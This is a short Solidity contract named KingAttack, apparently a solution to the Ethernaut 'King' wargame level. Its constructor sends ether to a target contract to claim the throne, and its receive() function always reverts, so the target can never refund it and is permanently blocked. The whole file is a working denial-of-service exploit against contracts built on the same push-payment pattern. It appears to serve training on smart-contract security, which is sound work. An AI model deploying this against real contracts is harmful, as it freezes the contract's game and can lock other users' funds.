pragma solidity 0.8.0;

contract KingAttack {

  address payable public owner;

  constructor(address payable _adr) payable {
    owner = payable(msg.sender);  
    (bool success,  ) = _adr.call{value: msg.value}("");
  }

  receive() external payable {
    revert();
  }

  function Attack() public {
  }
}